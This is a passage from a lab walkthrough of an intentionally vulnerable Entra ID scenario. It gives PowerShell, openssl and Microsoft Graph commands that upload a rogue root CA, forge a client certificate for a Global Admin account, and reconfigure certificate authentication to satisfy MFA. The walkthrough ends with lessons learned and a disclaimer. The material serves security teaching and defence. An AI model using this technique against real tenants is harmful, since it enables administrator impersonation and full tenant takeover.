</span></span><span class="line"><span class="cl"><span class="nv">$uploadSuccess</span> <span class="p">=</span> <span class="vm">$false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$configs</span><span class="p">.</span><span class="py">value</span> <span class="o">-and</span> <span class="nv">$configs</span><span class="p">.</span><span class="py">value</span><span class="p">.</span><span class="py">Count</span> <span class="o">-gt</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ca</span> <span class="k">in</span> <span class="nv">$configs</span><span class="p">.</span><span class="n">value</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="n">certificateAuthorities</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$certBytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$ca</span><span class="p">.</span><span class="n">certificate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$cert</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.X509Certificates.X509Certificate2</span><span class="p">]::</span><span class="n">new</span><span class="p">(</span><span class="nv">$certBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$cert</span><span class="p">.</span><span class="py">Thumbprint</span> <span class="o">-eq</span> <span class="nv">$rootCA</span><span class="p">.</span><span class="n">Thumbprint</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nb">Write-Output</span> <span class="s2">&#34;[+] Root CA successfully uploaded to tenant&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nb">Write-Output</span> <span class="s2">&#34;    Thumbprint: </span><span class="p">$(</span><span class="nv">$cert</span><span class="p">.</span><span class="n">Thumbprint</span><span class="p">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nb">Write-Output</span> <span class="s2">&#34;    Subject: </span><span class="p">$(</span><span class="nv">$cert</span><span class="p">.</span><span class="n">Subject</span><span class="p">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$uploadSuccess</span> <span class="p">=</span> <span class="vm">$true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$uploadSuccess</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Write-Output</span> <span class="s2">&#34;[-] Failed to verify root CA upload. Please check the configuration.&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Great! The root CA is now uploaded (<em>Figure 20</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%2019.png"></p>
<p><em>Figure 20. Confirmation of successful upload of the root CA</em></p>
<p>With the rogue CA accepted and trusted, we can now issue a client certificate for any identity (including the EntraGoat-admin-s6 user) and sign them using our newly and totally legitimate root CA:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Generate client certificate private key and signing request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="nv">$opensslBinary</span> <span class="n">req</span> <span class="n">-new</span> <span class="n">-sha256</span> <span class="n">-config</span> <span class="n">client</span><span class="p">.</span><span class="py">conf</span> <span class="n">-newkey</span> <span class="n">rsa</span><span class="err">:</span><span class="mf">4096</span> <span class="n">-nodes</span> <span class="n">-keyout</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.key&#34;</span> <span class="n">-out</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.csr&#34;</span> <span class="n">-subj</span> <span class="s2">&#34;/C=US/ST=Washingaot/L=EvilDistrict/O=EntraGoat/OU=Security/CN=</span><span class="nv">$adminUPN</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Sign the client certificate with root CA</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="nv">$opensslBinary</span> <span class="n">ca</span> <span class="n">-batch</span> <span class="n">-md</span> <span class="n">sha256</span> <span class="n">-config</span> <span class="n">ca</span><span class="p">.</span><span class="py">conf</span> <span class="n">-extensions</span> <span class="n">v3</span><span class="p">\</span><span class="n">_req</span> <span class="n">-out</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.crt&#34;</span> <span class="n">-infiles</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.csr&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Convert to PFX format for Windows installation</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="nv">$opensslBinary</span> <span class="n">pkcs12</span> <span class="n">-inkey</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.key&#34;</span> <span class="n">-in</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.crt&#34;</span> <span class="n">-export</span> <span class="n">-out</span> <span class="s2">&#34;</span><span class="nv">$adminUPN</span><span class="s2">.pfx&#34;</span> <span class="n">-password</span> <span class="n">pass</span><span class="err">:</span><span class="n">EntraGoat123</span><span class="p">!</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="step-8-passwordless-authentication-to-ga">Step 8: Passwordless authentication to GA<a hidden class="anchor" aria-hidden="true" href="#step-8-passwordless-authentication-to-ga">#</a></h3>
<p>To complete the privileged escalation path:</p>
<ol>
<li><strong>Install</strong> the issued .pfx certificate located in $caWorkspace on your local machine (<em>Figure 21</em>). The import password is EntraGoat123!.</li>
</ol>
<p><img loading="lazy" src="/posts/scenario6/image%2020.png"></p>
<p><em>Figure 21. Installing the .pfx certificate</em></p>
<ol start="2">
<li>Follow the instructions of the Certificate Import Wizard. After installation, confirm the certificate appears in certmgr.msc under <strong>Personal → Certificates</strong>, as Figure 22 shows.</li>
</ol>
<p><img loading="lazy" src="/posts/scenario6/image%2021.png"></p>
<p><em>Figure 22. Confirmation of our evil root certificate</em></p>
<ol start="3">
<li>Navigate to <a href="https://portal.azure.com">https://portal.azure.com</a> or <a href="https://entra.microsoft.com/">https://entra.microsoft.com/</a>.</li>
<li>Enter the UPN for the EntraGoat-admin-s6 account.</li>
<li>When prompted, select the installed certificate (Figure 23).</li>
</ol>
<p><img loading="lazy" src="/posts/scenario6/image%2022.png"></p>
<p><em>Figure 23. Selecting the evil root certificate</em></p>
<h3 id="step-9-troubleshooting-cba-and-mfa-binding">Step 9: Troubleshooting CBA and MFA binding<a hidden class="anchor" aria-hidden="true" href="#step-9-troubleshooting-cba-and-mfa-binding">#</a></h3>
<p>If authentication fails with <strong>Certificate validation failed</strong>*,* it’s likely due to misconfigured certificate parameters or SAN/OID formatting errors.</p>
<p>However, if you successfully reach the **Stay signed in?<em><em>prompt and are then redirected to <strong>Choose a way to sign in</strong></em>,</em> this indicates that:</p>
<ul>
<li>The certificate is valid</li>
<li>CBA is enabled</li>
<li><strong>But</strong> the tenant’s authentication binding policy classifies certificates as single-factor authentication</li>
<li><strong>And</strong> tenant policies require multifactor authentication for privileged access</li>
</ul>
<p>In that case, the default mode value x509CertificateAuthenticationDefaultMode is set to single-factor x509CertificateSingleFactor and because of that, CBA <strong>does not satisfy MFA</strong> requirements on its own (<em>Figure 24</em>) and cannot be used to access privileged accounts.</p>
<p><img loading="lazy" src="/posts/scenario6/image%2023.png"></p>
<p><em>Figure 24. MFA is still required</em></p>
<p>To resolve this, an Authentication Policy Administrator can update the default binding mode to x509CertificateMultiFactor, allowing CBA to meet MFA requirements (<em>Figure 25</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%2024.png"></p>
<p><em>Figure 25. Configuring MFA compliance</em></p>
<p>We can set CBA with Terence user’s security context:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get current config</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$current</span> <span class="p">=</span> <span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">GET</span> <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Check current mode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$current</span><span class="p">.</span><span class="py">authenticationModeConfiguration</span><span class="p">.</span><span class="py">x509CertificateAuthenticationDefaultMode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># change to MultiFactor if needed</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$params</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;@odata.type&#34;</span> <span class="p">=</span> <span class="s2">&#34;#microsoft.graph.x509CertificateAuthenticationMethodConfiguration&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">id</span> <span class="p">=</span> <span class="s2">&#34;X509Certificate&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">certificateUserBindings</span> <span class="p">=</span> <span class="nv">$current</span><span class="p">.</span><span class="py">certificateUserBindings</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">authenticationModeConfiguration</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">x509CertificateAuthenticationDefaultMode</span> <span class="p">=</span> <span class="s2">&#34;x509CertificateMultiFactor&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">x509CertificateDefaultRequiredAffinityLevel</span> <span class="p">=</span> <span class="s2">&#34;low&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">rules</span> <span class="p">=</span> <span class="vm">@</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">includeTargets</span> <span class="p">=</span> <span class="nv">$current</span><span class="p">.</span><span class="py">includeTargets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">excludeTargets</span> <span class="p">=</span> <span class="nv">$current</span><span class="p">.</span><span class="py">excludeTargets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="p">=</span> <span class="s2">&#34;enabled&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">issuerHintsConfiguration</span> <span class="p">=</span> <span class="nv">$current</span><span class="p">.</span><span class="py">issuerHintsConfiguration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">crlValidationConfiguration</span> <span class="p">=</span> <span class="nv">$current</span><span class="p">.</span><span class="py">crlValidationConfiguration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">certificateAuthorityScopes</span> <span class="p">=</span> <span class="vm">@</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Apply changes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">PATCH</span> <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate&#34;</span> <span class="n">-Body</span> <span class="p">(</span><span class="nv">$params</span> <span class="p">|</span> <span class="nb">ConvertTo-Json</span> <span class="n">-Depth</span> <span class="mf">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Verify change</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$updated</span> <span class="p">=</span> <span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">GET</span> <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$updated</span><span class="p">.</span><span class="py">authenticationModeConfiguration</span><span class="p">.</span><span class="py">x509CertificateAuthenticationDefaultMode</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Alternative (GUI):</strong> You can also configure this through the Entra admin portal (<em>Figure 26</em>). Follow this path:</p>
<p>Entra ID → Authentication methods → Policies → Certificate-based authentication → Configure</p>
<p>Under <strong>Authentication binding</strong>, set Default authentication strength to <strong>Multi-factor</strong>.</p>
<p><img loading="lazy" src="/posts/scenario6/image%2025.png"></p>
<p><em>Figure 26. Configuring MFA-compliance in Entra admin portal</em></p>
<p>With this policy in place, the forged client certificate can now be used to log in as
EntraGoat-admin-s6, fully passwordless and MFA-compliant, completing the attack chain and granting Global Administrator access to retrieve the flag from the UI (<em>Figure 27</em>),</p>
<p><img loading="lazy" src="/posts/scenario6/image%2026.png"></p>
<p><em>Figure 27. Flag captured</em></p>
<p>Once the scenario is completed, we execute the cleanup script to restore the tenant to its original state.</p>
<h2 id="lesson-learned-misconfigurations-open-attack-paths">Lesson learned: Misconfigurations open attack paths<a hidden class="anchor" aria-hidden="true" href="#lesson-learned-misconfigurations-open-attack-paths">#</a></h2>
<p>This scenario reveals how chained misconfigurations across service principals, app role assignments, and authentication settings can be weaponized to achieve full Entra ID tenant compromise without ever interacting with user passwords.</p>
<p>It starts with leaked credentials for a low-privileged legacy service principal, which is common in automation sprawl, and escalates by abusing overlooked permissions of Application.ReadWrite.OwnedBy and Organization.ReadWrite.All.</p>
<p>By pivoting between owned service principals and activating a PIM-based group assignment, the attacker enables CBA and uploads a malicious root CA to the tenant.</p>
<p>Finally, by issuing a forged client certificate for the Global Admin account, changing the tenant’s authentication binding policy rule on certificates to satisfy MFA requirements, and logging in with it via CBA, the attacker bypasses passwords and MFA.</p>
<p>This attack path exposes overlooked gaps in trust boundaries and identity architecture, showing how <strong>identity has become the new perimeter, susceptible to layered misconfigurations and unintended privilege chains.</strong></p>
<h2 id="endnote">Endnote<a hidden class="anchor" aria-hidden="true" href="#endnote">#</a></h2>
<p>1 <a href="https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f">https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f</a></p>
<h2 id="disclaimer">Disclaimer<a hidden class="anchor" aria-hidden="true" href="#disclaimer">#</a></h2>
<p>This content is provided for educational and informational purposes only. It is intended to promote awareness and responsible remediation of security vulnerabilities that may exist on systems you own or are authorized to test. Unauthorized use of this information for malicious purposes, exploitation, or unlawful access is strictly prohibited. We do not endorse or condone any illegal activity and disclaims any liability arising from misuse of the material. Additionally, We do not guarantee the accuracy or completeness of the content and assumes no liability for any damages resulting from its use.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="next" href="http://localhost:1313/posts/scenario2/">
    <span class="title">Next »</span>
    <br>
    <span>EntraGoat Scenario 2: Exploiting App-Only Graph Permissions in Entra ID</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on x"
            href="https://x.com/intent/tweet/?text=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f&amp;title=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID&amp;summary=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f&title=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on whatsapp"
            href="https://api.whatsapp.com/send?text=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID on telegram"
            href="https://telegram.me/share/url?text=EntraGoat%20Scenario%206%3a%20Exploiting%20Chained%20Misconfigurations%20to%20Impersonate%20Global%20Admin%20in%20Entra%20ID&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fscenario6%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
